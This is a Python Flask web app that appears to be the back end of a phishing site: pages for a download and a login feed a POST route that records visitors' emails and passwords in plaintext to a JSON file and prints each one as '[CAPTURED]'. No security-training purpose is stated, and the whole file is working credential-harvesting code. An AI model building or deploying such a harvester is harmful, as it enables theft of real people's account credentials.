from flask import Flask, render_template, request, redirect, url_for
import json
import os
from datetime import datetime

app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CAPTURE_FILE = os.path.join(BASE_DIR, "captured_download.json")


def init_capture_file():
    if not os.path.exists(CAPTURE_FILE):
        with open(CAPTURE_FILE, "w") as f:
            json.dump({"entries": []}, f, indent=2)


def save_captured_data(email, password):
    init_capture_file()
    with open(CAPTURE_FILE, "r") as f:
        data = json.load(f)

    entry = {
        "email": email,
        "password": password,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    data["entries"].append(entry)

    with open(CAPTURE_FILE, "w") as f:
        json.dump(data, f, indent=2)

    print(f"\n[CAPTURED] Email: {email} | Password: {password} | Time: {entry['timestamp']}\n")


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/download")
def download():
    return render_template("download.html")


@app.route("/login")
def login():
    return render_template("login.html")


@app.route("/capture-download", methods=["POST"])
def capture_download():
    email = request.form.get("email", "")
    password = request.form.get("password", "")
    save_captured_data(email, password)
    return redirect(url_for("success"))


@app.route("/success")
def success():
    return render_template("success.html")


if __name__ == "__main__":
    init_capture_file()
    app.run(debug=True, port=5000)
